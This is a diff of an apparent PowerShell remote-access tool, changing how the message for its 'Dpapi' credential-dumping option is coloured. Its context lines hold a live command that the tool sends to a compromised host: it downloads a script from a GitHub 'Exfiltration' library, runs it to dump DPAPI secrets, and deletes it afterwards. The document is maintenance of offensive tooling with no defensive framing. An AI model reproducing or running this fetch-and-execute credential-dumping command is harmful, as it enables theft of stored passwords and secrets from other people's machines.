@@ -3622,7 +3622,9 @@ While($Client.Connected)
         }
         If($pass_choise -ieq "Dpapi")
         {
-           write-host " * Dumping $Remote_Host DPAPI secrets." -ForegroundColor Green
+           write-host " * Dump " -ForegroundColor Green -NoNewline
+           write-host "$Remote_Host" -ForegroundColor Red -NoNewline
+           write-host " DPAPI secrets." -ForegroundColor Green
            $Command = "iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Exfiltration/Invoke-VaultCmd.ps1`" -OutFile `"`$Env:TMP\Invoke-VaultCmd.ps1`"|Unblock-File;powershell -File `"`$Env:TMP\Invoke-VaultCmd.ps1`" -action `"DPAPI`" -banner `"false`";Remove-Item -Path `"`$Env:TMP\Invoke-VaultCmd.ps1`" -Force";
         }
         If($pass_choise -ieq "Vault")
